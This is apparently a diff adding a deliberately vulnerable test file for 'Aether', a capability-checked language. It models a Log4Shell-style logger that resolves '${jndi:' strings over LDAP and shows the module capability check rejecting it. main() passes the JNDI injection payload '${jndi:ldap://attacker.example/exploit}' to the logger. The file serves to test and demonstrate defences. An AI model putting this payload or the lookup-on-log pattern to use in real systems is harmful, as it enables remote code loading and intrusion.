@@ -1,0 +1,44 @@
+// Second gate. Suppose an agent "fixes" the E0801 effect leak the
+// lazy way: it widens every effects clause up the call chain to
+// include net.fetch, silencing the effect checker. The architecture
+// is still wrong — a logger should not reach the network — and Aether
+// still refuses, now at the MODULE boundary: the module declared only
+// `requires capability log`, never `net`. Two independent locks, both
+// in source, both auditable.
+//
+// Run:  aether check vulnerable_widened.aeth   -> E0701 (capability)
+
+module Logger
+  requires capability log
+  exports handleRequest
+end
+
+function jndiResolve(uri: String) returns String
+  effects net.fetch("ldap://*")
+do
+  return "REMOTE_CLASS_FROM:" + uri
+end
+
+function substitute(message: String) returns String
+  effects net.fetch("ldap://*")
+do
+  if startsWith?(message, "${jndi:") then
+    return jndiResolve(message)
+  end
+  return message
+end
+
+// Effects clause widened to net.fetch — E0801 is silenced, but the
+// promise is now openly broken at the module capability level.
+function handleRequest(userInput: String) returns Unit
+  effects log, net.fetch("ldap://*")
+do
+  let rendered: String = substitute(userInput)
+  print("LOG " + rendered)
+end
+
+function main() returns Unit
+  effects log, net.fetch("ldap://*")
+do
+  handleRequest("${jndi:ldap://attacker.example/exploit}")
+end
